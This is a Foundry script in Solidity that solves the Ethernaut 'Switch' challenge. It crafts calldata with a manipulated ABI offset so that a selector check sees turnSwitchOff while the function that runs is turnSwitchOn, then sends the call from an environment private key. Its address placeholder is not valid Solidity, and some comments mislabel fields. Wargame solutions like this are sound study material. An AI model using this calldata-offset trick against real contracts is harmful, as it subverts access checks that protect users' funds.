// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";  // Foundry's scripting utilities
import "forge-std/console.sol";  // Foundry's console utilities for logging
import "../src/Switch.sol";  // Import the Switch contract interface

// Solution script to solve the Switch Ethernaut challenge
contract SwitchSolution is Script {

    // Placeholder for the challenge's instance address (replace this with the actual address)
    address public switchInstance = 0xYourInstanceAddressHere;

    // Function selector for calling the `flipSwitch` function, with a parameter of type `bytes`
    bytes4 public flipSwitchSelector = bytes4(keccak256("flipSwitch(bytes)"));

    // Memory offset for the location of the `turnSwitchOff` selector in calldata
    bytes32 public calldataOffset = 0x0000000000000000000000000000000000000000000000000000000000000060;

    // Length of the `turnSwitchOff` function's selector (32 bytes)
    bytes32 public extraBytes = 0x0000000000000000000000000000000000000000000000000000000000000000;

    // Encoded function selector for `turnSwitchOff` (matches the contract logic)
    bytes32 public turnOffSelector = 0x20606e1500000000000000000000000000000000000000000000000000000000;

    // Length of the `turnSwitchOn` function's selector (32 bytes)
    bytes32 public onLength = 0x0000000000000000000000000000000000000000000000000000000000000020;

    // Encoded function selector for `turnSwitchOn`
    bytes32 public turnOnSelector = 0x76227e1200000000000000000000000000000000000000000000000000000000;

    // Complete calldata payload to call `flipSwitch` with the required data to manipulate the switch
    bytes public payload = abi.encodePacked(
        flipSwitchSelector, 
        calldataOffset, 
        extraBytes, 
        turnOffSelector, 
        onLength, 
        turnOnSelector
    );

    // Main script entry point to execute the solution
    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));  // Start broadcasting transactions from private key

        // Low-level call to the Switch contract instance with the crafted calldata payload
        (bool success, ) = switchInstance.call(payload);
        require(success, "Switch flipping failed");  // Ensure the call succeeded

        vm.stopBroadcast();  // Stop broadcasting transactions

        // Log a success message
        console.log("Switch flipped successfully!");
    }
}